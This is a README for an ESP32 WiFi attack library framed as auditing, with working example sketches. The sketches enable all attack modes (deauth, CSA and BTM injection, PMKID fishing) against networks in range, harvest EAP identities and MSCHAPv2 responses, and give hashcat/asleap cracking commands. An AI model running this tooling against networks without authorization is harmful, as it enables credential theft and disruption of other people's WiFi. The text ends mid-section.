# Politician

> **A sophisticated WiFi auditing library for ESP32 microcontrollers**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PlatformIO](https://img.shields.io/badge/PlatformIO-Compatible-blue.svg)](https://platformio.org/)

Politician is an embedded C++ library designed for WiFi security auditing on ESP32 platforms. It provides a clean, modern API for capturing WPA/WPA2/WPA3 handshakes and harvesting enterprise credentials using advanced 802.11 protocol techniques.

## Migration Notes

### ClientFoundCb signature change (develop)

`ClientFoundCb` was changed from `(const uint8_t *bssid, const uint8_t *sta, int8_t rssi)` to `(const ClientRecord &rec)`. Update existing callbacks:

```cpp
// Before
engine.setClientFoundCallback([](const uint8_t *bssid, const uint8_t *sta, int8_t rssi) { … });

// After
engine.setClientFoundCallback([](const ClientRecord &rec) {
    // rec.bssid, rec.sta, rec.rssi — same data plus rand_mac, vendor, timestamps
});
```

## Key Capabilities

- **PMKID Capture** — Extract PMKIDs via fake association without disconnecting any client
- **CSA Injection** — Channel Switch Announcement; modern PMF-bypassing alternative to deauth
- **802.11v BTM Injection** — BSS Transition Management Request; politely steers clients to reconnect
- **Classic Deauth** — Reason-7 deauthentication for legacy networks without PMF
- **Client Stimulation** — Wake sleeping devices with QoS Null Data frames
- **Enterprise Credential Harvesting** — Passively capture EAP-Identity and bare EAP-MSCHAPv2 exchanges
- **WPS M1 Capture** — Harvest device fingerprint attributes from unencrypted WPS Enrollee M1 messages
- **Hidden Network Discovery** — SSID decloaking via directed probe requests; optional wordlist cycling
- **VHT/HE Detection** — Parse 802.11ac/ax IEs to expose channel width and Wi-Fi generation per AP
- **Device Fingerprinting** — Identify 150+ IoT/consumer brands via MAC OUI and IE signatures
- **Export Formats** — Streaming PCAPNG (Wireshark-compatible); auxiliary HC22000 for Hashcat; Wigle CSV

## Architecture

The library is built around a non-blocking state machine managing channel hopping, target selection, attack execution, and capture processing. All operations are contained within the `politician` namespace.

### Core Headers

| Header | Description |
|--------|-------------|
| `Politician.h` | Main engine class — include this in every project |
| `PoliticianTypes.h` | Public structs, enums, and compile-time feature gates |
| `PoliticianStorage.h` | SD card loggers and NVS persistence (Arduino only) |
| `PoliticianFormat.h` | PCAPNG and HC22000 serialization primitives |
| `PoliticianStress.h` | Opt-in DoS payloads (SAE flood, probe flood, beacon flood) |
| `PoliticianProbe.h` | Opt-in PROGMEM wordlist for hidden SSID probing |
| `PoliticianWPS.h` | Opt-in WPS M1 print helpers and bitmask constants |

### Attack Modes

| Mode | Bit | Description |
|------|-----|-------------|
| `ATTACK_PMKID` | `0x01` | PMKID fishing via fake association |
| `ATTACK_CSA` | `0x02` | Channel Switch Announcement injection |
| `ATTACK_PASSIVE` | `0x04` | Listen-only — zero transmission |
| `ATTACK_DEAUTH` | `0x08` | Classic Reason-7 deauthentication |
| `ATTACK_STIMULATE` | `0x10` | QoS Null Data client stimulation |
| `ATTACK_BTM` | `0x20` | 802.11v BSS Transition Management Request |
| `ATTACK_ALL` | `0x3F` | All active attack vectors |

## Compile-Time Feature Gates

Define any of these **before** including `Politician.h` or via your build system (`-DNAME`):

```ini
; platformio.ini
build_flags =
    -DPOLITICIAN_NO_DB           ; Strip 14KB OUI database (no vendor lookups)
    -DPOLITICIAN_NO_PCAPNG       ; Strip PCAPNG serialization
    -DPOLITICIAN_NO_HC22000      ; Strip Hashcat HC22000 formatter
    -DPOLITICIAN_NO_LOGGING      ; Strip all internal Serial log output
    -DPOLITICIAN_NO_STD_FUNCTION ; Use raw fn pointers instead of std::function
    -DPOLITICIAN_NO_MSCHAPV2     ; Strip bare EAP-MSCHAPv2 capture
    -DPOLITICIAN_NO_KARMA        ; Strip KARMA rogue AP responder
    -DPOLITICIAN_MAX_INSTANCES=1 ; Limit to one instance (saves a pointer array slot)
```

`POLITICIAN_NO_STD_FUNCTION` reverts all callback types from `std::function<>` to raw function pointers — saving ~2KB flash and enabling use in environments without `<functional>`. Lambda captures are unavailable when this flag is set.

`POLITICIAN_MAX_INSTANCES` (default `2`) controls the size of the static instance registry used by the promiscuous ISR dispatcher. Set to `1` for single-instance deployments to eliminate the loop overhead in the ISR.

## Installation

### PlatformIO

```ini
[env:myboard]
platform = espressif32
board = esp32dev
framework = arduino
lib_deps =
    Politician
```

Or clone directly into your project's `lib/` directory:

```bash
cd lib/
git clone https://github.com/0ldev/Politician.git
```

### Arduino IDE

1. Download the library as a ZIP file
2. **Sketch** → **Include Library** → **Add .ZIP Library**

### ESP-IDF

Clone into your project's `components/` directory and create a `CMakeLists.txt`:

```cmake
idf_component_register(
    SRCS "src/Politician.cpp" "src/PoliticianFormat.cpp" "src/PoliticianStress.cpp"
    INCLUDE_DIRS "src"
)
```

> `PoliticianStorage.h` is Arduino-only and emits a `#error` under ESP-IDF. Use ESP-IDF's VFS and `nvs_flash` APIs directly.

## Quick Start

### Basic Handshake Capture

```cpp
#include <Arduino.h>
#include <SD.h>
#include <Politician.h>
#include <PoliticianStorage.h>

using namespace politician;
using namespace politician::storage;

Politician engine;
PcapngFileLogger pcap; // Streaming logger — one open(), many write() calls

void onHandshake(const HandshakeRecord &rec) {
    Serial.printf("[✓] %s  ch%d  rssi=%d  type=%d\n",
                  rec.ssid, rec.channel, rec.rssi, rec.type);
    pcap.write(rec);
}

void setup() {
    Serial.begin(115200);
    SD.begin();

    pcap.open(SD, "/captures.pcapng", 4 * 1024 * 1024); // optional auto-rotation at 4MB

    engine.setEapolCallback(onHandshake);
    engine.begin();
    engine.setAttackMask(ATTACK_ALL);
}

void loop() {
    engine.tick();
}
```

### Bare ESP-IDF Quick Start

```cpp
#include <nvs_flash.h>
#include <esp_event.h>
#include <Politician.h>

using namespace politician;
static Politician engine;

static void audit_task(void *) {
    engine.setEapolCallback([](const HandshakeRecord &rec) {
        printf("[+] %s  ch%d\n", rec.ssid, rec.channel);
    });
    engine.begin();
    engine.setAttackMask(ATTACK_ALL);
    for (;;) { engine.tick(); vTaskDelay(pdMS_TO_TICKS(1)); }
}

extern "C" void app_main(void) {
    nvs_flash_init();
    esp_event_loop_create_default();
    xTaskCreate(audit_task, "politician", 8192, nullptr, 5, nullptr);
}
```

## API Reference

### Initialization

```cpp
Error begin(const Config &cfg = Config());
```

Initializes the WiFi driver in promiscuous mode. Must be called before any other method. Clamps and warns on invalid Config values at startup. Use `validateConfig(cfg, reasons, maxReasons)` beforehand if you want to inspect validation issues before `begin()`.

### Configuration

```cpp
struct Config {
    // ── Channel Hopping ──────────────────────────────────────────────────────
    uint16_t hop_dwell_ms             = 200;    // Static dwell time per channel (ms)
    bool     smart_hopping            = true;   // Dynamic dwell based on traffic activity
    uint16_t hop_min_dwell_ms         = 50;     // Minimum dwell (smart hopping floor)
    uint16_t hop_max_dwell_ms         = 400;    // Maximum dwell (smart hopping ceiling)
    uint32_t m1_lock_ms               = 800;    // Stay on channel after seeing M1 (ms)

    // ── PMKID Fishing ────────────────────────────────────────────────────────
    uint32_t fish_timeout_ms          = 2000;   // Timeout per PMKID association attempt
    uint8_t  fish_max_retries         = 2;      // PMKID retries before pivoting to CSA

    // ── CSA / Deauth ─────────────────────────────────────────────────────────
    uint32_t csa_wait_ms              = 4000;   // Wait window after CSA/Deauth burst (ms)
    uint8_t  csa_beacon_count         = 8;      // CSA beacon frames per burst
    uint8_t  csa_deauth_count         = 15;     // Deauth frames appended to CSA burst
    uint8_t  deauth_burst_count       = 16;     // Frames per standalone deauth burst
    uint8_t  deauth_reason            = 7;      // 802.11 reason code in deauth frames
    bool     deauth_reason_cycling    = true;   // Cycle reason codes during burst (fuzzing)

    // ── 802.11v BTM ──────────────────────────────────────────────────────────
    uint8_t  btm_burst_count          = 8;      // BTM Request frames per client per trigger
    uint16_t btm_disassoc_timer       = 3;      // Disassociation Timer in TBTTs (~300ms)

    // ── Timing & Intervals ───────────────────────────────────────────────────
    uint16_t probe_aggr_interval_s    = 30;     // Seconds between re-attacking the same AP
    uint32_t session_timeout_ms       = 60000;  // Orphaned handshake session lifetime (ms)
    uint32_t ap_expiry_ms             = 300000; // Evict APs not seen for this long (0=never)
    uint32_t probe_hidden_interval_ms = 0;      // Probe hidden APs every N ms (0=disabled)

    // ── Capture & Logging ────────────────────────────────────────────────────
    uint8_t  capture_filter           = LOG_FILTER_HANDSHAKES | LOG_FILTER_PROBES;
    bool     capture_half_handshakes  = false;  // Fire callback on M2-only; pivot to active
    bool     capture_group_keys       = false;  // Fire eapolCb on GTK rotation frames

    // ── Filtering ────────────────────────────────────────────────────────────
    int8_t   min_rssi                 = -100;   // Ignore APs weaker than this (dBm)
    uint8_t  min_beacon_count         = 0;      // Min beacons before attack/callback (0=off)
    uint8_t  max_total_attempts       = 0;      // Permanently skip after N failures (0=∞)
    bool     skip_immune_networks     = true;   // Skip pure WPA3 / PMF-Required APs
    bool     require_active_clients   = false;  // Skip attack if no clients seen on AP
    bool     unicast_deauth           = true;   // Deauth known client MAC, not broadcast
    uint8_t  sta_filter[6]            = {};     // Only record EAPOL from this client (0=any)
    char     ssid_filter[33]          = {};     // Only cache APs matching this SSID (empty=any)
    bool     ssid_filter_exact        = true;   // true=exact, false=substring SSID match
    uint8_t  enc_filter_mask          = 0xFF;   // Enc types to cache (bit0=Open … bit5=OWE)

    // ── Soft AP ──────────────────────────────────────────────────────────────
    const char* soft_ap_ssid          = nullptr; // AP SSID (nullptr=hidden "WiFighter")
};
```

### Callbacks

Register any subset — unregistered callbacks have zero overhead.

```cpp
void setEapolCallback(EapolCb cb);           // Handshake captured (EAPOL, PMKID, group key)
void setApFoundCallback(ApFoundCb cb);       // New AP discovered (after min_beacon_count)
void setIdentityCallback(IdentityCb cb);     // EAP-Identity plaintext harvested
void setWpsCallback(WpsCb cb);               // WPS M1 device attributes captured
void setMsChapCallback(MsChapCb cb);         // Bare EAP-MSCHAPv2 challenge/response (#ifndef POLITICIAN_NO_MSCHAPV2)
void setClientFoundCallback(ClientFoundCb cb); // New STA seen on an AP (ClientRecord)
void setRogueApCallback(RogueApCb cb);       // Second BSSID advertising same SSID (evil twin)
void setAttackResultCallback(AttackResultCb cb); // Attack exhausted without capture
void setProbeRequestCallback(ProbeRequestCb cb); // Probe request frame received
void setDisruptCallback(DisruptCb cb);       // Deauth/Disassoc frame observed
void setTargetFilter(TargetFilterCb cb);     // Return false to ignore an AP entirely
void setTargetScoreCallback(TargetScoreCb cb); // Custom priority score for autoTarget
void setPacketLogger(PacketCb cb);           // Raw promiscuous-mode frames
void setLogger(LogCb cb);                    // Redirect internal log output
```

### Engine Control

```cpp
void    tick();                           // Main worker — call from loop()
void    setActive(bool active);           // Enable/disable frame processing
void    stop();                           // Full teardown: abort attack, clear target, stop hopping
void    startHopping(uint16_t dwellMs=0); // Start channel hopping
void    stopHopping();                    // Stop hopping (attack state machine continues)
Error   lockChannel(uint8_t ch);          // Stop hopping, lock to a channel
Error   setChannel(uint8_t ch);           // Tune radio to a channel
void    setChannelList(const uint8_t *channels, uint8_t count); // Restrict hop sequence
uint8_t getChannelsSortedByActivity(uint8_t *out, uint8_t count) const; // Busy channels first
uint8_t setAutoChannelList(uint8_t topN);      // Replace hop list with hottest channels
void    setChannelBands(bool ghz24, bool ghz5); // Hop 2.4GHz, 5GHz, or both
```

### Target Control

```cpp
Error   setTarget(const uint8_t *bssid, uint8_t channel); // Focus on one BSSID
Error   setTargetBySsid(const char *ssid);                // Pick strongest match from cache
void    clearTarget();                                      // Resume autonomous hopping
bool    hasTarget()    const;                               // True if focused on a target
bool    isAttacking()  const;                               // True if attack in progress
void    setAutoTarget(bool enable);                         // Continuously target strongest AP
void    setAttackMask(uint8_t mask);                        // Active attack vector bitmask
void    setAttackMaskForBssid(const uint8_t *bssid, uint8_t mask); // Per-BSSID override
void    setAttackMaskForSsid(const char *ssid, uint8_t mask, bool substring=false);
void    clearAttackMaskOverrides();
void    setDisconnectionStrategy(DisconnectStrategy strategy); // STRATEGY_AUTO_FALLBACK / SIMULTANEOUS
```

### AP Cache & Stats

```cpp
int    getApCount() const;
bool   getAp(int idx, ApRecord &out) const;
bool   getApByBssid(const uint8_t *bssid, ApRecord &out) const;
void   forEachAp(void (*cb)(const ApRecord &ap, void *ctx), void *ctx) const;
int    getClientCount(const uint8_t *bssid) const;
bool   getClient(const uint8_t *bssid, int idx, uint8_t out_sta[6]) const;
Stats& getStats();
void   resetStats();
```

### Probe Wordlist

```cpp
void setProbeWordlist(const char * const *wordlist, uint8_t count);
```

When `cfg.probe_hidden_interval_ms > 0`, the engine probes each hidden AP with one wordlist entry per interval, cycling independently per AP. Use with `PoliticianProbe.h`:

```cpp
#include <PoliticianProbe.h>
using namespace politician::probe;

cfg.probe_hidden_interval_ms = 5000;
engine.begin(cfg);
engine.setProbeWordlist(WORDLIST, WORDLIST_COUNT); // 70-entry built-in list
```

Pass `nullptr` to revert to wildcard-only probing. The wordlist must remain in scope for the engine's lifetime (PROGMEM or static storage).

### Frame Injection

```cpp
Error injectCustomFrame(const uint8_t *payload, size_t len, uint8_t channel,
                        uint32_t lock_ms = 0, bool wait_for_channel = false);
```

- `lock_ms > 0` — disable hopping and hold channel for this duration after injection
- `wait_for_channel = true` — queue frame for stealthy injection when hopper naturally lands on the channel

---

## Data Structures

### Config Constants

```cpp
// Encryption type constants (ApRecord.enc, enc_filter_mask bit index)
#define ENC_OPEN    0   // Open — no encryption
#define ENC_WEP     1   // WEP
#define ENC_WPA     2   // WPA (vendor IE 00:50:F2:01)
#define ENC_WPA2    3   // WPA2 / WPA3-Transition (RSN IE, PSK or SAE AKM)
#define ENC_ENT     4   // 802.1X Enterprise (RSN IE, 802.1X AKM suite 1)
#define ENC_OWE     5   // OWE — Opportunistic Wireless Encryption (AKM suite 18)
                        // Engine skips PMKID fishing and CSA/Deauth for OWE networks.

// Attack bits
#define ATTACK_PMKID        0x01
#define ATTACK_CSA          0x02
#define ATTACK_PASSIVE      0x04
#define ATTACK_DEAUTH       0x08
#define ATTACK_STIMULATE    0x10
#define ATTACK_BTM          0x20
#define ATTACK_ALL          0x3F

// Capture types (HandshakeRecord.type)
#define CAP_PMKID           0x01  // PMKID via fake association
#define CAP_EAPOL           0x02  // Full passive 4-way handshake
#define CAP_EAPOL_CSA       0x03  // 4-way triggered by CSA/Deauth
#define CAP_EAPOL_HALF      0x04  // M2-only — active pivot triggered
#define CAP_EAPOL_GROUP     0x05  // GTK rotation (non-pairwise EAPOL-Key)
#define CAP_SAE             0x06  // WPA3 SAE Commit/Confirm

// Pairwise cipher classification (HandshakeRecord.cipher)
#define CIPHER_UNKNOWN      0
#define CIPHER_TKIP         1
#define CIPHER_CCMP         2

// Capture filter flags (Config.capture_filter)
#define LOG_FILTER_HANDSHAKES   0x01  // EAPOL + PMKID (SPI SD safe)
#define LOG_FILTER_PROBES       0x02  // Probe requests/responses (SPI SD safe)
#define LOG_FILTER_BEACONS      0x04  // Beacons — high volume, SDMMC only
#define LOG_FILTER_PROBE_REQ    0x08  // Probe requests as raw EPBs (SPI SD safe)
#define LOG_FILTER_MGMT_DISRUPT 0x10  // Deauth/Disassoc EPBs (SPI SD safe)
#define LOG_FILTER_ALL          0xFF  // Everything — SDMMC only
```

### ApRecord

```cpp
struct ApRecord {
    uint8_t  bssid[6];
    char     ssid[33];
    uint8_t  ssid_len;
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  enc;               // ENC_OPEN=0 ENC_WEP=1 ENC_WPA=2 ENC_WPA2=3 ENC_ENT=4 ENC_OWE=5
    bool     wps_enabled;       // WPS IE present in beacon/probe-response
    bool     pmf_capable;       // MFPC — AP supports Protected Management Frames
    bool     pmf_required;      // MFPR — AP mandates PMF (pure WPA3)
    bool     ft_capable;        // 802.11r FT AKM advertised (FT-PSK or FT-EAP)
    bool     is_hidden;         // Broadcasts empty SSID
    bool     is_vht;            // 802.11ac (Wi-Fi 5) capable
    bool     is_he;             // 802.11ax (Wi-Fi 6) capable
    uint8_t  chan_width;        // Max channel width: 0=20 1=40 2=80 3=160 4=80+80 MHz
    uint8_t  total_attempts;    // Failed attack attempts against this BSSID (drives exp. backoff)
    bool     captured;          // On the captured or ignore list
    uint32_t first_seen_ms;     // millis() when first observed
    uint32_t last_seen_ms;      // millis() of most recent beacon/probe-response
    char     country[3];        // ISO 3166-1 alpha-2 from IE 7 (e.g. "US"), empty if absent
    uint16_t beacon_interval;   // Beacon interval in TUs (1 TU = 1024 µs)
    uint8_t  max_rate_mbps;     // Highest rate from Supported Rates IEs (Mbps)
    uint16_t sta_count;         // Connected client count from BSS Load IE
    uint8_t  chan_util;         // Channel utilization from BSS Load IE (0-255)
    uint8_t  venue_group;       // 802.11u Venue Group (e.g., 2=Education)
    uint8_t  venue_type;        // 802.11u Venue Type (e.g., 8=University)
    uint8_t  network_type;      // 802.11u Access Network Type (1=Free Public, 2=Chargeable)
    uint32_t beacon_count;      // Beacon/probe-response observations cached for this AP
    uint8_t  capture_count;     // Captures recorded for this BSSID
    uint32_t last_attack_ms;    // millis() when an active attack last targeted this AP
};
```

### Stats

```cpp
struct Stats {
    uint32_t total;
    uint32_t mgmt;
    uint32_t ctrl;
    uint32_t data;
    uint32_t eapol;
    uint32_t pmkid_found;
    uint32_t sae_found;
    uint32_t beacons;
    uint32_t captures;
    uint32_t failed_pmkid;
    uint32_t failed_csa;
    volatile uint32_t dropped;    // Frames dropped due to ringbuffer overflow
    uint32_t rb_max;              // Max observed ringbuffer usage (bytes)
    uint16_t channel_frames[200]; // Frames per channel, indexed by channel number
                                  // (e.g. ch1=index1, ch36=index36; index 0 unused)
};
```

### HandshakeRecord

```cpp
struct HandshakeRecord {
    uint8_t  type;           // CAP_PMKID / CAP_EAPOL / CAP_EAPOL_CSA / CAP_EAPOL_HALF / CAP_EAPOL_GROUP / CAP_SAE
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  bssid[6];
    uint8_t  sta[6];
    char     ssid[33];
    uint8_t  ssid_len;
    uint8_t  enc;
    uint8_t  cipher;         // CIPHER_UNKNOWN / CIPHER_TKIP / CIPHER_CCMP
    uint8_t  pmkid[16];      // PMKID path
    uint8_t  anonce[32];     // EAPOL path
    uint8_t  snonce[32];
    uint8_t  mic[16];
    uint8_t  eapol_m2[256];
    uint8_t  eapol_m3[256];
    uint8_t  eapol_m4[256];
    uint16_t eapol_m2_len;
    uint16_t eapol_m3_len;
    uint16_t eapol_m4_len;
    bool     has_mic;
    bool     has_anonce;
    bool     has_snonce;
    bool     has_m3;
    bool     has_m4;
    bool     is_full;        // Complete 4-way or full SAE exchange
    uint8_t  sae_seq;        // SAE Auth Sequence (1=Commit, 2=Confirm)
};
```

### EapIdentityRecord

```cpp
struct EapIdentityRecord {
    uint8_t bssid[6];
    uint8_t client[6];
    char    identity[65];  // Plaintext identity / email — always cleartext, pre-TLS
    uint8_t channel;
    int8_t  rssi;
    uint8_t eap_method;      // Last seen outer EAP method
};
```

### WpsRecord

Captured from WPS M1 (Enrollee → AP). M1 is always unencrypted — subsequent messages are inside a TLS tunnel and cannot be read passively.

```cpp
struct WpsRecord {
    uint8_t  bssid[6];
    uint8_t  sta[6];             // WPS Enrollee MAC
    uint8_t  channel;
    int8_t   rssi;
    char     device_name[33];    // Device Name (TLV 0x1011)
    char     manufacturer[65];   // Manufacturer (TLV 0x1021)
    char     model_name[33];     // Model Name (TLV 0x1023)
    char     model_number[33];   // Model Number (TLV 0x1024)
    char     serial_number[33];  // Serial Number (TLV 0x1042)
    uint16_t auth_type_flags;    // Supported auth types (TLV 0x1004)
    uint16_t config_methods;     // Setup methods: PBC, PIN, NFC (TLV 0x1008)
    uint8_t  rf_bands;           // bit0=2.4GHz, bit1=5GHz (TLV 0x103C)
    uint16_t primary_dev_type_cat; // Device category (TLV 0x1054)
};
```

Use `PoliticianWPS::print(Serial, rec)` for formatted output. See `PoliticianWPS.h` for bitmask constants and helpers.

### MsChapRecord *(requires bare MSCHAPv2 — no PEAP/TTLS tunnel)*

```cpp
// #ifndef POLITICIAN_NO_MSCHAPV2
struct MsChapRecord {
    uint8_t bssid[6];
    uint8_t sta[6];
    uint8_t channel;
    int8_t  rssi;
    char    username[65];
    uint8_t server_challenge[16]; // From MSCHAPv2 Challenge frame
    uint8_t peer_challenge[16];   // From MSCHAPv2 Response frame
    uint8_t nt_response[24];      // Offline crackable with hashcat -m 5500
};
// #endif
```

> **Note:** This only fires against networks delivering bare EAP-MSCHAPv2 without a TLS tunnel — a misconfiguration. Most enterprise networks wrap MSCHAPv2 inside PEAP or TTLS, making it opaque. `EapIdentityRecord` (username only) works against all 802.1X deployments regardless of inner method.

### Other Records

```cpp
struct ClientRecord       { uint8_t bssid[6]; uint8_t sta[6]; int8_t rssi; uint32_t first_seen_ms; uint32_t last_seen_ms; bool rand_mac; char vendor[32]; };
struct AttackResultRecord { uint8_t bssid[6]; char ssid[33]; uint8_t ssid_len; AttackResult result; };
struct RogueApRecord      { uint8_t known_bssid[6]; uint8_t rogue_bssid[6]; char ssid[33]; uint8_t ssid_len; uint8_t channel; int8_t rssi; };
struct ProbeRequestRecord { uint8_t client[6]; uint8_t channel; int8_t rssi; char ssid[33]; uint8_t ssid_len; bool rand_mac; };
struct DisruptRecord      { uint8_t src[6]; uint8_t dst[6]; uint8_t bssid[6]; uint16_t reason; uint8_t subtype; uint8_t channel; int8_t rssi; bool rand_mac; };
```

---

## Storage Utilities

Requires `#include <PoliticianStorage.h>`. Arduino only.

### Streaming PCAPNG (Recommended)

Keep the file handle open across the entire capture session — avoids repeated SD open/close overhead and reduces wear:

```cpp
PcapngFileLogger pcap;

void setup() {
    SD.begin();
    storage::setTimestampProvider([]() -> const char * { return "2025-01-01 00:00:00"; });
    pcap.open(SD, "/captures.pcapng", 8 * 1024 * 1024); // optional rotation threshold
}

void onHandshake(const HandshakeRecord &rec) {
    pcap.write(rec);
}

void onPacket(const uint8_t *payload, uint16_t len, int8_t rssi, uint8_t ch, uint32_t ts) {
    pcap.writePacket(payload, len, rssi, ch, ts);
}

void teardown() {
    pcap.close(); // or let destructor handle it
}
```

### One-Shot PCAPNG (Legacy)

Opens and closes the file on every call — suitable for infrequent writes:

```cpp
PcapngFileLogger::append(SD, "/captures.pcapng", rec);
PcapngFileLogger::appendPacket(SD, "/intel.pcapng", payload, len, rssi, ch, ts);
```

### HC22000

```cpp
Hc22000FileLogger hc;
hc.open(SD, "/captures.hc22000");
hc.write(rec);
hc.close();

// Or one-shot:
Hc22000FileLogger::append(SD, "/captures.hc22000", rec);
```

### Wigle CSV

```cpp
// Log an AP (use in setApFoundCallback)
WigleCsvLogger::appendAp(SD, "/wardrive.csv", ap, lat, lon);

// Log a capture (use in setEapolCallback)
WigleCsvLogger::append(SD, "/wardrive.csv", rec, lat, lon);
```

### Enterprise CSV

```cpp
EnterpriseCsvLogger::append(SD, "/identities.csv", rec); // also logs outer EAP method + timestamp
```

### NVS BSSID Cache (Deduplication)

```cpp
NvsBssidCache nvsCache("captures", 128);

void onHandshake(const HandshakeRecord &rec) {
    if (!nvsCache.contains(rec.bssid)) {
        nvsCache.add(rec.bssid);   // staged in RAM — not written to flash yet
        // ... log record ...
    }
}

void onTeardown() {
    if (nvsCache.isDirty()) {
        nvsCache.flush();   // single NVS write for all staged adds
    }
}
```

The dirty-flag pattern batches NVS writes: `add()` only updates RAM; `flush()` performs the single NVS `putBytes()` call. Call `flush()` at natural checkpoints (e.g., channel hop, button press, `end()`).

### Network Stream Loggers

```cpp
TcpStreamLogger tcp(collectorIp, 9000);
UdpStreamLogger udp(collectorIp, 9001);

tcp.write(rec);
udp.writePacket(payload, len, rssi, ch, ts);
```

Define `POLITICIAN_NO_NETWORK_LOGGER` to strip these Arduino/WiFi-backed streamers.

---

## Advanced Features

### 802.11v BTM Injection

BTM (BSS Transition Management) is a Wi-Fi 802.11v mechanism that politely asks clients to roam. When a client respects it, it disconnects and reassociates — triggering a new EAPOL handshake. Combines with or replaces CSA/Deauth:

```cpp
Config cfg;
cfg.btm_burst_count   = 8;  // frames per client
cfg.btm_disassoc_timer = 3; // TBTTs (~300ms) until expected disassoc
engine.begin(cfg);
engine.setAttackMask(ATTACK_BTM | ATTACK_CSA); // BTM first, CSA as fallback
```

BTM fires independently for every known client on the target AP. Most modern phones and laptops honour it; legacy 802.11a/b/g devices ignore it.

### WPS M1 Device Fingerprinting

```cpp
#include <PoliticianWPS.h>
using namespace politician;

engine.setWpsCallback([](const WpsRecord &rec) {
    PoliticianWPS::print(Serial, rec);
    // rec.config_methods & PoliticianWPS::CFG_PUSH_BUTTON → PBC supported
    // rec.rf_bands & 0x02 → 5GHz capable
});
```

### Bare EAP-MSCHAPv2 Capture

```cpp
engine.setMsChapCallback([](const MsChapRecord &rec) {
    Serial.printf("[MSCHAPv2] user=%s\n", rec.username);
    // Feed to: hashcat -m 5500 "user::::peer_chal:nt_resp:srv_chal"
    // or: asleap -C server_challenge -R nt_response
});
```

### Hidden Network Discovery with Wordlist

```cpp
#include <PoliticianProbe.h>
using namespace politician::probe;

Config cfg;
cfg.probe_hidden_interval_ms = 5000; // probe one word every 5s per hidden AP
engine.begin(cfg);
engine.setProbeWordlist(WORDLIST, WORDLIST_COUNT); // 70 common SSIDs in PROGMEM

// Optionally supply your own:
static const char * const myList[] = { "CorpNet", "HQ-Internal", "IoT-Devices" };
engine.setProbeWordlist(myList, 3);
```

Each hidden AP in the cache maintains its own position in the wordlist — APs cycle independently so no word is ever skipped. If the AP responds, its SSID is revealed and stored in the cache automatically.

### VHT/HE Detection

```cpp
engine.setApFoundCallback([](const ApRecord &ap) {
    const char *gen = ap.is_he ? "Wi-Fi 6 (ax)" : ap.is_vht ? "Wi-Fi 5 (ac)" : "Wi-Fi 4 (n)";
    const char *width[] = { "20MHz", "40MHz", "80MHz", "160MHz", "80+80MHz" };
    Serial.printf("%s  %s  %s\n", ap.ssid, gen, width[ap.chan_width]);
});
```

### HE/VHT-Aware Attack Path

Wi-Fi 5 (VHT) and Wi-Fi 6 (HE) networks that mandate PMF (`pmf_required = true`) cryptographically sign every management frame. Deauthentication and CSA beacon injections will be silently dropped by these clients.

The engine automatically detects this condition and suppresses `ATTACK_DEAUTH` and `ATTACK_CSA` for those networks, redirecting the attack cycle to `ATTACK_PMKID` and `ATTACK_BTM` — both of which work regardless of PMF:

```
is_he && pmf_required  →  skip DEAUTH + CSA  →  PMKID fish → BTM steer
is_vht && pmf_required →  skip DEAUTH + CSA  →  PMKID fish → BTM steer
```

No configuration required — suppression is automatic. Use `ATTACK_ALL` and the engine selects the correct strategy per AP.

### Exponential Backoff for Failing Targets

Each `ApCacheEntry` tracks `total_attempts` — the number of failed attack cycles against that BSSID. The PMKID throttle window doubles per failure, capped at 8 minutes:

```
throttle = base_ms << min(total_attempts, 4)   // max 16× base
cap      = 480 000 ms (8 minutes)
```

| Attempts | Base 30s | Effective window |
|----------|----------|-----------------|
| 0 | 30s | 30s |
| 1 | 30s | 60s |
| 2 | 30s | 2 min |
| 3 | 30s | 4 min |
| ≥4 | 30s | 8 min (capped) |

This prevents the engine wasting its attack window on chronic failures. When `has_target = true` (manual target pinned) backoff is bypassed entirely so targeted sessions always attack immediately.

### Multi-Instance Support

Up to `POLITICIAN_MAX_INSTANCES` (default **2**) independent `Politician` objects can be active simultaneously. Each instance has its own ring buffer, worker task, AP cache, and callback set. The single promiscuous ISR dispatches every captured frame to all registered active instances.

```cpp
#define POLITICIAN_MAX_INSTANCES 2  // default; define before including Politician.h
#include <Politician.h>
using namespace politician;

Politician scanner;   // hops 2.4 GHz, passive scan only
Politician auditor;   // locked to ch6, active PMKID capture

void setup() {
    Config scanCfg;
    scanCfg.attack_mask = ATTACK_PASSIVE;
    if (scanner.begin(scanCfg) != OK) { /* handle */ }
    scanner.startHopping();

    Config auditCfg;
    auditCfg.attack_mask = ATTACK_PMKID;
    if (auditor.begin(auditCfg) != OK) { /* handle */ }
    auditor.lockChannel(6);
    auditor.setActive(true);
}

void loop() {
    scanner.tick();
    auditor.tick();
}
```

**Constraints:**
- All instances share the single Wi-Fi radio. `esp_wifi_set_channel()` affects every instance — coordinate channel access explicitly or use `lockChannel()` on the instance that should own the channel.
- The Wi-Fi driver is initialised once by whichever instance calls `begin()` first. Subsequent instances skip driver init and inherit the promiscuous mode.
- Exceeding `POLITICIAN_MAX_INSTANCES` returns `ERR_MAX_INSTANCES (6)` from `begin()`.
- `stop()` deregisters the instance so its slot is immediately reusable.



### AP Iteration and Rich Client Discovery

```cpp
engine.forEachAp([](const ApRecord &ap, void *) {
    Serial.printf("%s beacons=%lu captures=%u\n", ap.ssid, (unsigned long)ap.beacon_count, ap.capture_count);
}, nullptr);

engine.setClientFoundCallback([](const ClientRecord &rec) {
    Serial.printf("STA %02X:%02X:%02X:%02X:%02X:%02X rand=%d vendor=%s\n",
                  rec.sta[0], rec.sta[1], rec.sta[2], rec.sta[3], rec.sta[4], rec.sta[5],
                  rec.rand_mac, rec.vendor);
});
```

```cpp
engine.setTargetScoreCallback([](const ApRecord &ap, const char *vendor) -> int {
    int score = ap.rssi;
    if (strstr(vendor, "Apple"))    score += 50;
    if (strstr(vendor, "Hikvision")) score += 80;
    if (ap.is_hidden)               score -= 100;
    return score;
});
engine.setAutoTarget(true);
engine.startHopping();
```

### Per-BSSID / Per-SSID Attack Overrides

```cpp
uint8_t sensitive_ap[6] = { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF };
engine.setAttackMaskForBssid(sensitive_ap, ATTACK_PASSIVE); // passive-only for this AP
engine.setAttackMaskForSsid("CorpWiFi", ATTACK_PASSIVE);
engine.setAttackMaskForSsid("Guest", ATTACK_PMKID | ATTACK_PASSIVE, true); // substring match
engine.setAttackMask(ATTACK_ALL);                           // global default unchanged
```

### Custom Disconnection Strategy

```cpp
